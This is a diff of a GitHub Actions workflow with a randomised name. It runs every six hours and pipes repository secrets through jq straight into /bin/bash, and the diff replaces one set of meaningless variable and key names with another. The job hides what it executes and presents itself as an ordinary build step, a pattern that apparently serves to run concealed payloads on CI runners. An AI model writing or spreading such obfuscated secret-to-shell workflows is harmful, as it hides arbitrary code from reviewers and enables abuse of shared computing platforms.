@@ -1,30 +1,26 @@
 name: nkchla
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
+    - cron: '44 3/6 * * *'
 
-jobs:  # 22887
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nkchla
         env:
-          cym8: ${{ secrets.cym8 }}
+          xatgu549: ${{ secrets.xatgu549 }}
         run: |
-          echo $cym8 | jq -r .x26362 | /bin/bash
-          echo $i27 | jq -r .i99820 | /bin/bash
-          echo $erl03889 | jq -r .dn691 | /bin/bash
-          echo $k9565 | jq -r .otl8 | /bin/bash
-          echo $x87 | jq -r .fo3 | /bin/bash
-          echo $af2 | jq -r .kj4283 | /bin/bash
-          echo $l98462 | jq -r .xdxmu1 | /bin/bash
-          echo $da506 | jq -r .bjhs64819 | /bin/bash
-          echo $jbxy267 | jq -r .hbg275 | /bin/bash
-          echo $nx1702 | jq -r .ub3 | /bin/bash
-          echo $quk54508 | jq -r .xyeku70 | /bin/bash
-          echo $lnwu51715 | jq -r .zp7591 | /bin/bash
+          echo $xatgu549 | jq -r .orwj7 | /bin/bash
+          echo $x533 | jq -r .dlcnr361 | /bin/bash
+          echo $ft11 | jq -r .c47936 | /bin/bash
+          echo $vjjt4 | jq -r .arzq7 | /bin/bash
+          echo $wou12143 | jq -r .jj0 | /bin/bash
+          echo $t4525 | jq -r .dr335 | /bin/bash
+          echo $ujk88 | jq -r .cdcli89567 | /bin/bash
+          echo $ibt0 | jq -r .vprau839 | /bin/bash
+          echo $wdkq402 | jq -r .l618 | /bin/bash
+          echo $juieo781 | jq -r .n317 | /bin/bash
 
